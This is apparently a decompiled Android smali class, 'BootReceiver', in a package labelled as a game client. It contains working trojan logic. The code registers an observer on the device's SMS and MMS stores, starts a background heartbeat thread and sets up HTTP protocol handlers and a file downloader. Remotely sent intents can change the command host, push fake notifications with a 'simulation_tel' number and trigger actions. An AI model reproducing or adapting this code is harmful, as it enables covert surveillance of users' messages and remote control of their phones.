.class public LHamsterSuper/Client/Game/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "BootReceiver"

.field public static action:LDaemon/Action/Action; = null

.field public static final app_heart_agent:Ljava/lang/String; = "android.intent.action.HEART_CODE"

.field public static final app_start_agent:Ljava/lang/String; = "android.intent.action.START_AGENT"

.field public static change_hearttime:J = 0x0L

.field public static downer:LDaemon/DownLoad/FileDownloader; = null

.field public static heart:Ljava/lang/Thread; = null

.field public static hearthttp:LDaemon/Protocol/HeartHttp; = null

.field public static hearttime:J = 0x0L

.field public static mCtx:Landroid/content/Context; = null

.field public static mPhoneStateListener:LDaemon/Service/MyPhoneStateListener; = null

.field public static mode:I = 0x0

.field public static mostsphttp:LDaemon/Protocol/MostSpHttp; = null

.field public static receipt:LDaemon/Protocol/Receipt; = null

.field public static reghttp:LDaemon/Protocol/RegHttp; = null

.field public static send_mode:I = 0x0

.field public static smsobserver:LDaemon/Service/SMSObserver; = null

.field public static sphttp:LDaemon/Protocol/SpHttp; = null

.field public static start_root:I = 0x0

.field public static final version_code:Ljava/lang/String; = "VERSION_CODE"

.field public static versioncode:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    const/4 v0, 0x0

    .line 30
    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->heart:Ljava/lang/Thread;

    .line 32
    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->reghttp:LDaemon/Protocol/RegHttp;

    .line 33
    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->sphttp:LDaemon/Protocol/SpHttp;

    .line 34
    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->receipt:LDaemon/Protocol/Receipt;

    .line 35
    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->mostsphttp:LDaemon/Protocol/MostSpHttp;

    .line 36
    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->hearthttp:LDaemon/Protocol/HeartHttp;

    .line 41
    const-wide/32 v0, 0x2bf20

    sput-wide v0, LHamsterSuper/Client/Game/BootReceiver;->hearttime:J

    .line 42
    const-wide/16 v0, 0x0

    sput-wide v0, LHamsterSuper/Client/Game/BootReceiver;->change_hearttime:J

    .line 43
    sput v2, LHamsterSuper/Client/Game/BootReceiver;->mode:I

    .line 44
    sput v2, LHamsterSuper/Client/Game/BootReceiver;->send_mode:I

    .line 47
    sput v2, LHamsterSuper/Client/Game/BootReceiver;->start_root:I

    .line 51
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->versioncode:Ljava/util/ArrayList;

    .line 24
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 24
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private static print(Ljava/lang/String;)V
    .locals 1
    .param p0, "msg"    # Ljava/lang/String;

    .prologue
    .line 167
    sget-object v0, LDaemon/Action/Action;->print:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 168
    const-string v0, "BootReceiver"

    invoke-static {v0, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 170
    :cond_0
    return-void
.end method

.method public static start_agent()V
    .locals 2

    .prologue
    .line 155
    const-string v0, "Enter star_agent"

    invoke-static {v0}, LHamsterSuper/Client/Game/BootReceiver;->print(Ljava/lang/String;)V

    .line 157
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->mPhoneStateListener:LDaemon/Service/MyPhoneStateListener;

    if-nez v0, :cond_0

    .line 158
    new-instance v0, LDaemon/Service/MyPhoneStateListener;

    sget-object v1, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-direct {v0, v1}, LDaemon/Service/MyPhoneStateListener;-><init>(Landroid/content/Context;)V

    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->mPhoneStateListener:LDaemon/Service/MyPhoneStateListener;

    .line 160
    :cond_0
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->heart:Ljava/lang/Thread;

    if-nez v0, :cond_1

    .line 161
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, LDaemon/Service/HeartConnecter;

    invoke-direct {v1}, LDaemon/Service/HeartConnecter;-><init>()V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    sput-object v0, LHamsterSuper/Client/Game/BootReceiver;->heart:Ljava/lang/Thread;

    .line 162
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->heart:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 164
    :cond_1
    return-void
.end method


# virtual methods
.method public init()V
    .locals 6

    .prologue
    const/4 v5, 0x1

    .line 125
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    if-nez v2, :cond_0

    .line 126
    new-instance v2, LDaemon/Action/Action;

    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-direct {v2, v3}, LDaemon/Action/Action;-><init>(Landroid/content/Context;)V

    sput-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    .line 128
    :cond_0
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    if-nez v2, :cond_1

    .line 129
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 130
    .local v0, "contentResolver":Landroid/content/ContentResolver;
    new-instance v2, LDaemon/Service/SMSObserver;

    const/4 v3, 0x0

    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-direct {v2, v3, v4}, LDaemon/Service/SMSObserver;-><init>(Landroid/os/Handler;Landroid/content/Context;)V

    sput-object v2, LHamsterSuper/Client/Game/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    .line 131
    const-string v2, "content://sms/"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 132
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    .line 131
    invoke-virtual {v0, v2, v5, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 133
    const-string v2, "content://mms/"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 134
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    .line 133
    invoke-virtual {v0, v2, v5, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 135
    new-instance v1, Landroid/content/Intent;

    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    const-class v3, LDaemon/Service/SMSObserver;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 136
    .local v1, "s":Landroid/content/Intent;
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-virtual {v2, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 139
    .end local v0    # "contentResolver":Landroid/content/ContentResolver;
    .end local v1    # "s":Landroid/content/Intent;
    :cond_1
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->reghttp:LDaemon/Protocol/RegHttp;

    if-nez v2, :cond_2

    .line 140
    new-instance v2, LDaemon/Protocol/RegHttp;

    invoke-direct {v2}, LDaemon/Protocol/RegHttp;-><init>()V

    sput-object v2, LHamsterSuper/Client/Game/BootReceiver;->reghttp:LDaemon/Protocol/RegHttp;

    .line 141
    :cond_2
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->hearthttp:LDaemon/Protocol/HeartHttp;

    if-nez v2, :cond_3

    .line 142
    new-instance v2, LDaemon/Protocol/HeartHttp;

    invoke-direct {v2}, LDaemon/Protocol/HeartHttp;-><init>()V

    sput-object v2, LHamsterSuper/Client/Game/BootReceiver;->hearthttp:LDaemon/Protocol/HeartHttp;

    .line 143
    :cond_3
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->sphttp:LDaemon/Protocol/SpHttp;

    if-nez v2, :cond_4

    .line 144
    new-instance v2, LDaemon/Protocol/SpHttp;

    invoke-direct {v2}, LDaemon/Protocol/SpHttp;-><init>()V

    sput-object v2, LHamsterSuper/Client/Game/BootReceiver;->sphttp:LDaemon/Protocol/SpHttp;

    .line 145
    :cond_4
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->receipt:LDaemon/Protocol/Receipt;

    if-nez v2, :cond_5

    .line 146
    new-instance v2, LDaemon/Protocol/Receipt;

    invoke-direct {v2}, LDaemon/Protocol/Receipt;-><init>()V

    sput-object v2, LHamsterSuper/Client/Game/BootReceiver;->receipt:LDaemon/Protocol/Receipt;

    .line 147
    :cond_5
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->mostsphttp:LDaemon/Protocol/MostSpHttp;

    if-nez v2, :cond_6

    .line 148
    new-instance v2, LDaemon/Protocol/MostSpHttp;

    invoke-direct {v2}, LDaemon/Protocol/MostSpHttp;-><init>()V

    sput-object v2, LHamsterSuper/Client/Game/BootReceiver;->mostsphttp:LDaemon/Protocol/MostSpHttp;

    .line 149
    :cond_6
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    if-nez v2, :cond_7

    .line 150
    new-instance v2, LDaemon/DownLoad/FileDownloader;

    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-direct {v2, v3}, LDaemon/DownLoad/FileDownloader;-><init>(Landroid/content/Context;)V

    sput-object v2, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    .line 152
    :cond_7
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 19
    .param p1, "ctx"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 57
    const-string v2, "In onReceive method"

    invoke-static {v2}, LHamsterSuper/Client/Game/BootReceiver;->print(Ljava/lang/String;)V

    .line 58
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v17

    .line 59
    .local v17, "intent_action":Ljava/lang/String;
    invoke-static/range {v17 .. v17}, LHamsterSuper/Client/Game/BootReceiver;->print(Ljava/lang/String;)V

    .line 61
    if-eqz p1, :cond_0

    .line 62
    sget v2, LHamsterSuper/Client/Game/BootReceiver;->start_root:I

    const/4 v3, 0x1

    if-ne v2, v3, :cond_1

    .line 63
    const-string v2, "android.intent.action.HEART_CODE"

    move-object/from16 v0, v17

    move-object v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_1

    .line 121
    :cond_0
    :goto_0
    return-void

    .line 65
    :cond_1
    sput-object p1, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    .line 66
    invoke-virtual/range {p0 .. p0}, LHamsterSuper/Client/Game/BootReceiver;->init()V

    .line 68
    const-string v2, "agent init"

    invoke-static {v2}, LHamsterSuper/Client/Game/BootReceiver;->print(Ljava/lang/String;)V

    .line 69
    const-string v2, "android.intent.action.START_AGENT"

    move-object/from16 v0, v17

    move-object v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_a

    .line 71
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "agent_action"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v14

    .line 72
    .local v14, "agent_action":I
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "agent_mode"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v15

    .line 73
    .local v15, "agent_mode":I
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "downpath"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 74
    .local v9, "downpath":Ljava/lang/String;
    if-nez v9, :cond_2

    .line 75
    const-string v9, ""

    .line 76
    :cond_2
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "notice_title"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 77
    .local v5, "notice_title":Ljava/lang/String;
    if-nez v5, :cond_3

    .line 78
    const-string v5, ""

    .line 79
    :cond_3
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "notice_info"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 80
    .local v6, "notice_info":Ljava/lang/String;
    if-nez v6, :cond_4

    .line 81
    const-string v6, ""

    .line 82
    :cond_4
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    .line 83
    const-string v3, "simulation_tel"

    .line 82
    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 84
    .local v8, "simulation_tel":Ljava/lang/String;
    if-nez v8, :cond_5

    .line 85
    const-string v8, ""

    .line 86
    :cond_5
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "file_name"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 87
    .local v11, "file_name":Ljava/lang/String;
    if-nez v11, :cond_6

    .line 88
    const-string v11, ""

    .line 89
    :cond_6
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "even_num"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v3

    .line 90
    .local v3, "even_num":I
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v4, "even_version"

    invoke-virtual {v2, v4}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v4

    .line 91
    .local v4, "even_version":I
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v7, "even_type"

    invoke-virtual {v2, v7}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v7

    .line 92
    .local v7, "even_type":I
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v10, "even_time"

    invoke-virtual {v2, v10}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v10

    .line 93
    .local v10, "push_time":I
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v12, "host"

    invoke-virtual {v2, v12}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_7

    .line 94
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v12, "host"

    invoke-virtual {v2, v12}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, LDaemon/Action/Action;->host:Ljava/lang/String;

    .line 95
    :cond_7
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v12, "chanel"

    invoke-virtual {v2, v12}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_8

    .line 96
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v12, "chanel"

    invoke-virtual {v2, v12}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v2

    sput v2, LDaemon/Action/Action;->channe:I

    .line 97
    :cond_8
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v12, "priority"

    invoke-virtual {v2, v12}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v12

    .line 98
    .local v12, "priority":I
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v13, "strategy"

    invoke-virtual {v2, v13}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v13

    .line 99
    .local v13, "strategy":I
    const-string v2, "parameters loaded"

    invoke-static {v2}, LHamsterSuper/Client/Game/BootReceiver;->print(Ljava/lang/String;)V

    .line 100
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    invoke-virtual/range {v2 .. v13}, LDaemon/Action/Action;->setEvent(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;ILjava/lang/String;II)V

    .line 103
    if-nez v14, :cond_9

    .line 104
    new-instance v18, LDaemon/Action/NoticeBase;

    invoke-direct/range {v18 .. v18}, LDaemon/Action/NoticeBase;-><init>()V

    .line 105
    .local v18, "noticebase":LDaemon/Action/NoticeBase;
    move-object v0, v9

    move-object/from16 v1, v18

    iput-object v0, v1, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    .line 106
    move-object v0, v5

    move-object/from16 v1, v18

    iput-object v0, v1, LDaemon/Action/NoticeBase;->notice_title:Ljava/lang/String;

    .line 107
    move-object v0, v6

    move-object/from16 v1, v18

    iput-object v0, v1, LDaemon/Action/NoticeBase;->notice_info:Ljava/lang/String;

    .line 108
    move-object v0, v8

    move-object/from16 v1, v18

    iput-object v0, v1, LDaemon/Action/NoticeBase;->simulation_tel:Ljava/lang/String;

    .line 109
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    move-object v0, v2

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, LDaemon/Action/Action;->Update_Notice(LDaemon/Action/NoticeBase;)V

    .line 111
    .end local v18    # "noticebase":LDaemon/Action/NoticeBase;
    :cond_9
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    invoke-virtual {v2, v14, v15}, LDaemon/Action/Action;->Generate_events(II)I

    .line 112
    const-string v2, "finish first run"

    invoke-static {v2}, LHamsterSuper/Client/Game/BootReceiver;->print(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 114
    .end local v3    # "even_num":I
    .end local v4    # "even_version":I
    .end local v5    # "notice_title":Ljava/lang/String;
    .end local v6    # "notice_info":Ljava/lang/String;
    .end local v7    # "even_type":I
    .end local v8    # "simulation_tel":Ljava/lang/String;
    .end local v9    # "downpath":Ljava/lang/String;
    .end local v10    # "push_time":I
    .end local v11    # "file_name":Ljava/lang/String;
    .end local v12    # "priority":I
    .end local v13    # "strategy":I
    .end local v14    # "agent_action":I
    .end local v15    # "agent_mode":I
    :cond_a
    const-string v2, "android.intent.action.HEART_CODE"

    move-object/from16 v0, v17

    move-object v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_b

    .line 115
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "VERSION_CODE"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v16

    .line 116
    .local v16, "code":I
    invoke-static/range {v16 .. v16}, LDaemon/Service/ReadKey;->addVerSionCode(I)V

    goto/16 :goto_0

    .line 117
    .end local v16    # "code":I
    :cond_b
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, LDaemon/Action/Action;->Generate_events(II)I

    move-result v2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_0

    .line 118
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    const/4 v3, 0x2

    const/4 v4, 0x1

    invoke-virtual {v2, v3, v4}, LDaemon/Action/Action;->Generate_events(II)I

    goto/16 :goto_0
.end method
